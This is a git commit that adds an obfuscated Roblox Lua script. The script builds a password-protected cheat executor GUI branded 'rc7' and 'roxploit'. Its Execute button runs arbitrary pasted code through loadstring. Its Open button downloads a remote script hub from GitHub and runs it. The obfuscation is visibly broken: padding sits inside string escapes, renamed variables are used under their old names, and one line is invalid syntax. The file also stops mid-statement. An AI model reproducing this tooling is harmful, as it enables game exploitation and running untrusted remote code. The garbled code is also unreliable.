7c937f0bdfda8162264d90bbafd426aa972be8f7
Dani <joulesfancydrives@gmail.com>
2025-02-23 01:21:23 -0500

    Create less.lua

---
+++ less.lua
@@ -0,0 +1,354 @@
+local v_YSfUohZq = 14
+local v_DbyzQrWK = 48
+local v_BksFTuRW = 30
+local v_iQCivHgH = 55
+local v_qIpUHXpu = 19
+-- Gui to Lua
+-- Version: 3 + 0.2 + 0
+
+-- Instances:
+game:GetService("\83 + 0\116 + 0\97 + 0\114 + 0\116 + 0\101 + 0\114 + 0\71 + 0\117 + 0\105 + 0"):SetCore("\83 + 0\101 + 0\110 + 0\100 + 0\78 + 0\111 + 0\116 + 0\105 + 0\102 + 0\105 + 0\99 + 0\97 + 0\116 + 0\105 + 0\111 + 0\110 + 0",{ 	Title = "\82 + 0\99 + 0\55 + 0",  	
+
+Text = "\112 + 0\97 + 0\115 + 0\115 + 0\119 + 0\111 + 0\114 + 0\100 + 0\58 + 0\32 + 0\82 + 0\99 + 0\55 + 0\67 + 0\114 + 0\97 + 0\99 + 0\107 + 0\101 + 0\100 + 0",
+
+})
+
+game:GetService("\83 + 0\116 + 0\97 + 0\114 + 0\116 + 0\101 + 0\114 + 0\71 + 0\117 + 0\105 + 0"):SetCore("\83 + 0\101 + 0\110 + 0\100 + 0\78 + 0\111 + 0\116 + 0\105 + 0\102 + 0\105 + 0\99 + 0\97 + 0\116 + 0\105 + 0\111 + 0\110 + 0",{ 	
+
+Title = "\119 + 0\97 + 0\105 + 0\116 + 0\46 + 0\46 + 0\46 + 0",  	
+
+Text = "\108 + 0\111 + 0\97 + 0\100 + 0\105 + 0\110 + 0\103 + 0\46 + 0\46 + 0\46 + 0",
+
+})
+
+wait(3 + 0)
+
+game:GetService("\83 + 0\116 + 0\97 + 0\114 + 0\116 + 0\101 + 0\114 + 0\71 + 0\117 + 0\105 + 0"):SetCore("\83 + 0\101 + 0\110 + 0\100 + 0\78 + 0\111 + 0\116 + 0\105 + 0\102 + 0\105 + 0\99 + 0\97 + 0\116 + 0\105 + 0\111 + 0\110 + 0",{ 	
+
+Title = "\108 + 0\111 + 0\97 + 0\100 + 0\101 + 0\100 + 0\33 + 0",  	
+
+Text = "\72 + 0\97 + 0\118 + 0\101 + 0\32 + 0\102 + 0\117 + 0\110 + 0\33 + 0",
+
+})
+local v_EdDvjEgQ = Instance.new("\83 + 0\99 + 0\114 + 0\101 + 0\101 + 0\110 + 0\71 + 0\117 + 0\105 + 0")
+local v_wqGEgyVH = Instance.new("\73 + 0\109 + 0\97 + 0\103 + 0\101 + 0\66 + 0\117 + 0\116 + 0\116 + 0\111 + 0\110 + 0")
+local v_noDllVVL = Instance.new("\73 + 0\109 + 0\97 + 0\103 + 0\101 + 0\76 + 0\97 + 0\98 + 0\101 + 0\108 + 0")
+local v_iPJhTLHE = Instance.new("\84 + 0\101 + 0\120 + 0\116 + 0\66 + 0\117 + 0\116 + 0\116 + 0\111 + 0\110 + 0")
+local v_OLYhJxyk = Instance.new("\84 + 0\101 + 0\120 + 0\116 + 0\66 + 0\111 + 0\120 + 0")
+local v_TyuhPFod = Instance.new("\84 + 0\101 + 0\120 + 0\116 + 0\66 + 0\111 + 0\120 + 0")
+local v_XkkMmwqU = Instance.new("\84 + 0\101 + 0\120 + 0\116 + 0\66 + 0\117 + 0\116 + 0\116 + 0\111 + 0\110 + 0")
+local v_ThroyklF = Instance.new("\84 + 0\101 + 0\120 + 0\116 + 0\66 + 0\117 + 0\116 + 0\116 + 0\111 + 0\110 + 0")
+local v_ifbjsdZC = Instance.new("\73 + 0\109 + 0\97 + 0\103 + 0\101 + 0\76 + 0\97 + 0\98 + 0\101 + 0\108 + 0")
+local v_YGGPjdxP = Instance.new("\84 + 0\101 + 0\120 + 0\116 + 0\66 + 0\111 + 0\120 + 0")
+local v_wCYOWUKb = Instance.new("\84 + 0\101 + 0\120 + 0\116 + 0\66 + 0\111 + 0\120 + 0")
+local v_AtOmGidS = Instance.new("\84 + 0\101 + 0\120 + 0\116 + 0\66 + 0\117 + 0\116 + 0\116 + 0\111 + 0\110 + 0")
+local v_qdzmOdGV = Instance.new("\84 + 0\101 + 0\120 + 0\116 + 0\66 + 0\117 + 0\116 + 0\116 + 0\111 + 0\110 + 0")
+local v_BUWnyBbg = Instance.new("\84 + 0\101 + 0\120 + 0\116 + 0\66 + 0\117 + 0\116 + 0\116 + 0\111 + 0\110 + 0")
+local v_FfxEqrBh = Instance.new("\84 + 0\101 + 0\120 + 0\116 + 0\66 + 0\117 + 0\116 + 0\116 + 0\111 + 0\110 + 0")
+local v_zMClEaNY = Instance.new("\84 + 0\101 + 0\120 + 0\116 + 0\66 + 0\117 + 0\116 + 0\116 + 0\111 + 0\110 + 0")
+local v_YxrbyYTu = Instance.new("\84 + 0\101 + 0\120 + 0\116 + 0\66 + 0\117 + 0\116 + 0\116 + 0\111 + 0\110 + 0")
+local v_iuKoXHRd = Instance.new("\84 + 0\101 + 0\120 + 0\116 + 0\66 + 0\117 + 0\116 + 0\116 + 0\111 + 0\110 + 0")
+
+--Properties:
+
+rc7.Name = "\114 + 0\99 + 0\55 + 0"
+rc7.Parent = game.CoreGui
+rc7.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+mini.Name = "\109 + 0\105 + 0\110 + 0\105 + 0"
+mini.Parent = rc7
+mini.BackgroundColor3 = Color3.fromRGB(255 + 0, 255 + 0, 255 + 0)
+mini.BackgroundTransparency = 1 + 0.000 + 0
+mini.BorderColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+mini.BorderSizePixel = 0 + 0
+mini.Position = UDim2.new(0 + 0, 0 + 0, 0 + 0.894399107 + 0, 0 + 0)
+mini.Size = UDim2.new(0 + 0, 58 + 0, 0 + 0, 60 + 0)
+mini.Visible = false
+mini.Image = "\104 + 0\116 + 0\116 + 0\112 + 0\58 + 0\47 + 0\47 + 0\119 + 0\119 + 0\119 + 0\46 + 0\114 + 0\111 + 0\98 + 0\108 + 0\111 + 0\120 + 0\46 + 0\99 + 0\111 + 0\109 + 0\47 + 0\97 + 0\115 + 0\115 + 0\101 + 0\116 + 0\47 + 0\63 + 0\105 + 0\100 + 0\61 + 0\49 + 0\52 + 0\52 + 0\49 + 0\54 + 0\48 + 0\50 + 0\49 + 0\51 + 0\57 + 0\48 + 0"
+mini.MouseButton1Down:connect(function()
+	mainpage.Visible = true
+mini.Visible = false
+end)
+
+passpage.Name = "\112 + 0\97 + 0\115 + 0\115 + 0\112 + 0\97 + 0\103 + 0\101 + 0"
+passpage.Parent = rc7
+passpage.Active = true
+passpage.BackgroundColor3 = Color3.fromRGB(255 + 0, 255 + 0, 255 + 0)
+passpage.BorderColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+passpage.BorderSizePixel = 0 + 0
+passpage.Position = UDim2.new(0 + 0.171028033 + 0, 0 + 0, 0 + 0.178529739 + 0, 0 + 0)
+passpage.Size = UDim2.new(0 + 0, 349 + 0, 0 + 0, 363 + 0)
+passpage.Image = "\114 + 0\98 + 0\120 + 0\97 + 0\115 + 0\115 + 0\101 + 0\116 + 0\105 + 0\100 + 0\58 + 0\47 + 0\47 + 0\49 + 0\51 + 0\54 + 0\57 + 0\53 + 0\52 + 0\52 + 0\48 + 0\48 + 0\55 + 0\48 + 0"
+
+submit.Name = "\115 + 0\117 + 0\98 + 0\109 + 0\105 + 0\116 + 0"
+submit.Parent = passpage
+submit.BackgroundColor3 = Color3.fromRGB(255 + 0, 255 + 0, 255 + 0)
+submit.BackgroundTransparency = 1 + 0.000 + 0
+submit.BorderColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+submit.BorderSizePixel = 0 + 0
+submit.Position = UDim2.new(0 + 0.343839556 + 0, 0 + 0, 0 + 0.561983466 + 0, 0 + 0)
+submit.Size = UDim2.new(0 + 0, 101 + 0, 0 + 0, 20 + 0)
+submit.Font = Enum.Font.SourceSans
+submit.Text = ""
+submit.TextColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+submit.TextSize = 14 + 0.000 + 0
+submit.MouseButton1Down:connect(function()
+	if pass.Text == "\82 + 0\99 + 0\55 + 0\67 + 0\114 + 0\97 + 0\99 + 0\107 + 0\101 + 0\100 + 0" then
+		passpage.Visible = false
+		mainpage.Visible = true
+	else
+		pass.Text = "\87 + 0\114 + 0\111 + 0\110 + 0\103 + 0\32 + 0\80 + 0\97 + 0\115 + 0\115 + 0\119 + 0\111 + 0\114 + 0\100 + 0\33 + 0"
+		wait(2 + 0)
+		pass.Text = ""
+	end
+end)
+
+user.Name = "\117 + 0\115 + 0\101 + 0\114 + 0"
+user.Parent = passpage
+user.BackgroundColor3 = Color3.fromRGB(255 + 0, 255 + 0, 255 + 0)
+user.BackgroundTransparency = 1 + 0.000 + 0
+user.BorderColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+user.BorderSizePixel = 0 + 0
+user.Position = UDim2.new(0 + 0.260744989 + 0, 0 + 0, 0 + 0.393939406 + 0, 0 + 0)
+user.Size = UDim2.new(0 + 0, 160 + 0, 0 + 0, 21 + 0)
+user.Font = Enum.Font.SourceSans
+user.Text = "\117 + 0\115 + 0\101 + 0\114 + 0\110 + 0\97 + 0\109 + 0\101 + 0"
+user.TextColor3 = Color3.fromRGB(20 + 0, 212 + 0, 255 + 0)
+user.TextSize = 14 + 0.000 + 0
+user.TextWrapped = true
+
+pass.Name = "\112 + 0\97 + 0\115 + 0\115 + 0"
+pass.Parent = passpage
+pass.BackgroundColor3 = Color3.fromRGB(255 + 0, 255 + 0, 255 + 0)
+pass.BackgroundTransparency = 1 + 0.000 + 0
+pass.BorderColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+pass.BorderSizePixel = 0 + 0
+pass.Position = UDim2.new(0 + 0.261000007 + 0, 0 + 0, 0 + 0.479999989 + 0, 0 + 0)
+pass.Size = UDim2.new(0 + 0, 160 + 0, 0 + 0, 21 + 0)
+pass.Font = Enum.Font.SourceSans
+pass.Text = ""
+pass.TextColor3 = Color3.fromRGB(20 + 0, 212 + 0, 255 + 0)
+pass.TextSize = 14 + 0.000 + 0
+pass.TextWrapped = true
+
+close.Name = "\99 + 0\108 + 0\111 + 0\115 + 0\101 + 0"
+close.Parent = passpage
+close.BackgroundColor3 = Color3.fromRGB(255 + 0, 255 + 0, 255 + 0)
+close.BackgroundTransparency = 1 + 0.000 + 0
+close.BorderColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+close.BorderSizePixel = 0 + 0
+close.Position = UDim2.new(0 + 0.88252151 + 0, 0 + 0, 0 + 0, 0 + 0)
+close.Size = UDim2.new(0 + 0, 41 + 0, 0 + 0, 24 + 0)
+close.Font = Enum.Font.SourceSans
+close.Text = ""
+close.TextColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+close.TextSize = 14 + 0.000 + 0
+close.MouseButton1Down:connect(function()
+	passpage.Visible = false
+end)
+
+minimize.Name = "\109 + 0\105 + 0\110 + 0\105 + 0\109 + 0\105 + 0\122 + 0\101 + 0"
+minimize.Parent = passpage
+minimize.BackgroundColor3 = Color3.fromRGB(255 + 0, 255 + 0, 255 + 0)
+minimize.BackgroundTransparency = 1 + 0.000 + 0
+minimize.BorderColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+minimize.BorderSizePixel = 0 + 0
+minimize.Position = UDim2.new(0 + 0.598853886 + 0, 0 + 0, 0 + 0, 0 + 0)
+minimize.Size = UDim2.new(0 + 0, 41 + 0, 0 + 0, 24 + 0)
+minimize.Font = Enum.Font.SourceSans
+minimize.Text = ""
+minimize.TextColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+minimize.TextSize = 14 + 0.000 + 0
+
+mainpage.Name = "\109 + 0\97 + 0\105 + 0\110 + 0\112 + 0\97 + 0\103 + 0\101 + 0"
+mainpage.Parent = rc7
+mainpage.Active = true
+mainpage.BackgroundColor3 = Color3.fromRGB(255 + 0, 255 + 0, 255 + 0)
+mainpage.BorderColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+mainpage.BorderSizePixel = 0 + 0
+mainpage.Position = UDim2.new(0 + 0.171028033 + 0, 0 + 0, 0 + 0.178529739 + 0, 0 + 0)
+mainpage.Size = UDim2.new(0 + 0, 349 + 0, 0 + 0, 363 + 0)
+mainpage.Visible = false
+mainpage.Image = "\104 + 0\116 + 0\116 + 0\112 + 0\58 + 0\47 + 0\47 + 0\119 + 0\119 + 0\119 + 0\46 + 0\114 + 0\111 + 0\98 + 0\108 + 0\111 + 0\120 + 0\46 + 0\99 + 0\111 + 0\109 + 0\47 + 0\97 + 0\115 + 0\115 + 0\101 + 0\116 + 0\47 + 0\63 + 0\105 + 0\100 + 0\61 + 0\49 + 0\51 + 0\49 + 0\57 + 0\55 + 0\54 + 0\48 + 0\55 + 0\54 + 0\51 + 0\54 + 0\56 + 0\57 + 0\55 + 0\55 + 0"
+
+local v_ucDOYTih = Instance.new("\83 + 0\99 + 0\114 + 0\111 + 0\108 + 0\108 + 0\105 + 0\110 + 0\103 + 0\70 + 0\114 + 0\97 + 0\109 + 0\101 + 0")
+scrollingFrame.Name = "\115 + 0\99 + 0\114 + 0\111 + 0\108 + 0\108 + 0\105 + 0\110 + 0\103 + 0\70 + 0\114 + 0\97 + 0\109 + 0\101 + 0"
+scrollingFrame.Parent = mainpage
+scrollingFrame.BackgroundTransparency = 1 + 0
+scrollingFrame.BorderColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+scrollingFrame.BorderSizePixel = 0 + 0
+scrollingFrame.Position = UDim2.new(0 + 0.0343839526 + 0, 0 + 0, 0 + 0.0991735533 + 0, 0 + 0)
+scrollingFrame.Size = UDim2.new(0 + 0, 296 + 0, 0 + 0, 239 + 0)
+scrollingFrame.CanvasSize = UDim2.new(0 + 0, 0 + 0, 0 + 0, 239 + 0)
+scrollingFrame.ScrollBarThickness = 6 + 0
+scrollingFrame.ScrollBarImageTransparency = 1 + 0
+scrollingFrame.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar
+
+local v_RMVNTWra = Instance.new("\84 + 0\101 + 0\120 + 0\116 + 0\66 + 0\111 + 0\120 + 0")
+input.Name = "\105 + 0\110 + 0\112 + 0\117 + 0\116 + 0"
+input.Parent = scrollingFrame
+input.BackgroundTransparency = 1 + 0
+input.BorderColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+input.BorderSizePixel = 0 + 0
+input.Size = UDim2.new(1 + 0, 0 + 0, 0 + 0, 239 + 0)
+input.Font = Enum.Font.Code
+input.MultiLine = true
+input.Text = "\45 + 0\45 + 0\32 + 0\119 + 0\101 + 0\108 + 0\99 + 0\111 + 0\109 + 0\101 + 0\32 + 0\116 + 0\111 + 0\32 + 0\114 + 0\99 + 0\55 + 0\32 + 0\114 + 0\101 + 0\109 + 0\97 + 0\107 + 0\101 + 0"
+input.TextColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+input.TextSize = 14 + 0
+input.TextWrapped = false
+input.TextXAlignment = Enum.TextXAlignment.Left
+input.TextYAlignment = Enum.TextYAlignment.Top
+input.ClearTextOnFocus = false
+input.ClipsDescendants = false
+
+input.Position = UDim2.new(0 + 0, 0 + 0, 0 + 0, 10 + 0)
+
+local v_PfNhQugj updateCanvasSize()
+    local v_sehHLXUz = input.TextBounds
+    input.Size = UDim2.new(1 + 0, 0 + 0, 0 + 0, math.max(textSize.Y + 10 + 0, 239 + 0))
+    scrollingFrame.CanvasSize = UDim2.new(0 + 0, 0 + 0, 0 + 0, input.Size.Y.Offset)
+end
+
+input:GetPropertyChangedSignal("\84 + 0\101 + 0\120 + 0\116 + 0"):Connect(updateCanvasSize)
+input.Focused:Connect(updateCanvasSize)
+input.FocusLost:Connect(updateCanvasSize)
+
+exe.Name = "\101 + 0\120 + 0\101 + 0"
+exe.Parent = mainpage
+exe.BackgroundColor3 = Color3.fromRGB(255 + 0, 255 + 0, 255 + 0)
+exe.BackgroundTransparency = 1 + 0
+exe.BorderColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+exe.BorderSizePixel = 0 + 0
+exe.Position = UDim2.new(0 + 0.315186232 + 0, 0 + 0, 0 + 0.774104655 + 0, 0 + 0)
+exe.Size = UDim2.new(0 + 0, 99 + 0, 0 + 0, 20 + 0)
+exe.Font = Enum.Font.ArialBold
+exe.Text = "\69 + 0\120 + 0\101 + 0\99 + 0\117 + 0\116 + 0\101 + 0"
+exe.TextColor3 = Color3.fromRGB(50 + 0, 110 + 0, 160 + 0)
+exe.TextSize = 14 + 0.000 + 0
+exe.TextTransparency = 1 + 0
+
+output.Name = "\111 + 0\117 + 0\116 + 0\112 + 0\117 + 0\116 + 0"
+output.Parent = mainpage
+output.Active = false
+output.BackgroundColor3 = Color3.fromRGB(255 + 0, 255 + 0, 255 + 0)
+output.BorderColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+output.BackgroundTransparency = 1 + 0
+output.BorderSizePixel = 0 + 0
+output.Position = UDim2.new(0 + 0.0343839526 + 0, 0 + 0, 0 + 0.845730007 + 0, 0 + 0)
+output.Size = UDim2.new(0 + 0, 296 + 0, 0 + 0, 52 + 0)
+output.Font = Enum.Font.Code
+output.Text = ""
+output.TextColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+output.TextSize = 14 + 0.000 + 0
+output.TextWrapped = true
+output.TextXAlignment = Enum.TextXAlignment.Left
+output.TextYAlignment = Enum.TextYAlignment.Top
+
+exe.MouseButton1Down:connect(function()
+    output.Text = ""
+    
+    local v_ANySXePF, result = pcall(function()
+        loadstring(input.Text)()
+    end)
+
+    if success then
+        output.Text = "\83 + 0\99 + 0\114 + 0\105 + 0\112 + 0\116 + 0\32 + 0\115 + 0\117 + 0\99 + 0\99 + 0\101 + 0\115 + 0\115 + 0\102 + 0\117 + 0\108 + 0\108 + 0\121 + 0\32 + 0\101 + 0\120 + 0\101 + 0\99 + 0\117 + 0\116 + 0\101 + 0\100 + 0\33 + 0"
+        output.TextColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+        wait(2 + 0)
+        output.Text = "\32 + 0"
+    else
+        output.Text = "\69 + 0\114 + 0\114 + 0\111 + 0\114 + 0\58 + 0\32 + 0" .. result
+        output.TextColor3 = Color3.fromRGB(255 + 0, 0 + 0, 0 + 0)
+        warn("\69 + 0\114 + 0\114 + 0\111 + 0\114 + 0\32 + 0\111 + 0\99 + 0\99 + 0\117 + 0\114 + 0\114 + 0\101 + 0\100 + 0\32 + 0\100 + 0\117 + 0\114 + 0\105 + 0\110 + 0\103 + 0\32 + 0\101 + 0\120 + 0\101 + 0\99 + 0\117 + 0\116 + 0\105 + 0\111 + 0\110 + 0\58 + 0\32 + 0" .. result)
+        wait(5 + 0)
+        output.Text = "\32 + 0"
+    end
+end)
+
+clear.Name = "\99 + 0\108 + 0\101 + 0\97 + 0\114 + 0"
+clear.Parent = mainpage
+clear.BackgroundColor3 = Color3.fromRGB(255 + 0, 255 + 0, 255 + 0)
+clear.BackgroundTransparency = 1 + 0
+clear.BorderColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+clear.BorderSizePixel = 0 + 0
+clear.Position = UDim2.new(0 + 0.598853886 + 0, 0 + 0, 0 + 0.774104655 + 0, 0 + 0)
+clear.Size = UDim2.new(0 + 0, 99 + 0, 0 + 0, 20 + 0)
+clear.Font = Enum.Font.ArialBold
+clear.Text = "\67 + 0\108 + 0\101 + 0\97 + 0\114 + 0"
+clear.TextColor3 = Color3.fromRGB(50 + 0, 110 + 0, 160 + 0)
+clear.TextSize = 14 + 0.000 + 0
+clear.TextTransparency = 1 + 0  -- Make the text transparent
+clear.MouseButton1Down:connect(function()
+    input.Text = "\32 + 0"
+end)
+
+open.Name = "\111 + 0\112 + 0\101 + 0\110 + 0"
+open.Parent = mainpage
+open.BackgroundColor3 = Color3.fromRGB(255 + 0, 255 + 0, 255 + 0)
+open.BackgroundTransparency = 1 + 0
+open.BorderColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+open.BorderSizePixel = 0 + 0
+open.Position = UDim2.new(0 + 0.0343839526 + 0, 0 + 0, 0 + 0.774104655 + 0, 0 + 0)
+open.Size = UDim2.new(0 + 0, 99 + 0, 0 + 0, 20 + 0)
+open.Font = Enum.Font.ArialBold
+open.Text = "\79 + 0\112 + 0\101 + 0\110 + 0"
+open.TextColor3 = Color3.fromRGB(50 + 0, 110 + 0, 160 + 0)
+open.TextSize = 14 + 0.000 + 0
+open.TextTransparency = 1 + 0
+open.MouseButton1Down:connect(function()
+    loadstring(game:HttpGet("\104 + 0\116 + 0\116 + 0\112 + 0\115 + 0\58 + 0\47 + 0\47 + 0\114 + 0\97 + 0\119 + 0\46 + 0\103 + 0\105 + 0\116 + 0\104 + 0\117 + 0\98 + 0\117 + 0\115 + 0\101 + 0\114 + 0\99 + 0\111 + 0\110 + 0\116 + 0\101 + 0\110 + 0\116 + 0\46 + 0\99 + 0\111 + 0\109 + 0\47 + 0\70 + 0\105 + 0\108 + 0\116 + 0\101 + 0\114 + 0\105 + 0\110 + 0\103 + 0\69 + 0\110 + 0\97 + 0\98 + 0\108 + 0\101 + 0\100 + 0\47 + 0\70 + 0\69 + 0\47 + 0\109 + 0\97 + 0\105 + 0\110 + 0\47 + 0\83 + 0\99 + 0\114 + 0\105 + 0\112 + 0\116 + 0\72 + 0\117 + 0\98 + 0"))()
+end)
+
+roxploit.Name = "\114 + 0\111 + 0\120 + 0\112 + 0\108 + 0\111 + 0\105 + 0\116 + 0"
+roxploit.Parent = mainpage
+roxploit.BackgroundColor3 = Color3.fromRGB(255 + 0, 255 + 0, 255 + 0)
+roxploit.BackgroundTransparency = 1 + 0.000 + 0
+roxploit.BorderColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+roxploit.BorderSizePixel = 0 + 0
+roxploit.Position = UDim2.new(0 + 0.904999971 + 0, 0 + 0, 0 + 0.799000025 + 0, 0 + 0)
+roxploit.Size = UDim2.new(0 + 0, 29 + 0, 0 + 0, 29 + 0)
+roxploit.Font = Enum.Font.SourceSans
+roxploit.Text = ""
+roxploit.TextColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0)
+roxploit.TextSize = 14 + 0.000 + 0
+roxploit.MouseButton1Down:connect(function()
+	Folder = game.Players.LocalPlayer.PlayerGui
+script=Instance.new('LocalScript')
+
+local v_RZGzVYJa,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z 
+local v_zKGjHiFT,B,C,D,F,E,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z 
+local v_ercLVMpp,Ba,Ca,Da,Fa,Ea,Ga,Ha,Ia,Ja,Ka,La,Ma,Na,Oa,Pa,Qa,Ra,Sa,Ta,Ua,Va,Wa,Xa,Ya,Za 
+local v_ZxIUUOOp = nil 
+local v_ZstNBekt,Toggle,taco = false 
+local v_KlUCKhNJ, Selected, Banned, WayPoint = nil 
+local v_YwZMBfHn = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") CId.Value = 0 + 0 
+local v_PlfVwROZ = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") LPCId.Value = 0 + 0 
+local v_BAnyOdye = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") 
+SId.Value = 0 + 0 
+local v_zUxydgaB = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") 
+MId.Value = 0 + 0 
+local v_yBwjaVvG = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") 
+MPId.Value = 0 + 0 
+local v_sVMrlHWa = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") 
+GId.Value = 0 + 0 
+local v_zDeyQVAs = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") 
+GPId.Value = 0 + 0 
+local v_TkuNOMAf = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") 
+HId.Value = 0 + 0 
+local v_bBUXltGo = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") 
+HPId.Value = 0 + 0 
+local v_GGmoVZNi = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") 
+SDId.Value = 0 + 0 
+local v_VJkpmVVM = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") WId.Value = 0 + 0 local v_fEAQgJxo = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") WMId.Value = 0 + 0 local v_kPVtuCQO = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") LCId.Value = 0 + 0 local v_zcYudfWj = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") TCId.Value = 0 + 0 local v_FoDfPddO = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") MEId.Value = 1 + 0 local v_WuIMNnmD = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") MEPId.Value = 0 + 0 local v_QQoCEVMU = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") SkyId.Value = 1 + 0 local v_KSXdZtes = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") SkypId.Value = 0 + 0 local v_PViSfWFZ = Instance.new("\73 + 0\110 + 0\116 + 0\86 + 0\97 + 0\108 + 0\117 + 0\101 + 0") TabId.Value = 0 + 0 
+local v_PDDoOOmT = UDim2.new(0 + 0,0 + 0,0 + 0,0 + 0) 
+local v_spNllegs = false 
+
+function f_XrsuTwFY(f) return coroutine.resume(coroutine.create(function()f()end)) end 
+function f_etFHxufB(SoundId,Volume,Pitch,Looped) 
+	A=Instance.new("\83 + 0\111 + 0\117 + 0\110 + 0\100 + 0",workspace) 
+	A.PlayOnRemove = true 
+	A.SoundId = "\114 + 0\98 + 0\120 + 0\97 + 0\115 + 0\115 + 0\101 + 0\116 + 0\105 + 0\100 + 0\58 + 0\47 + 0\47 + 0" .. SoundId 
+	A.Volume = Volume 
+	A.Pitch = Pitch 
+	A.
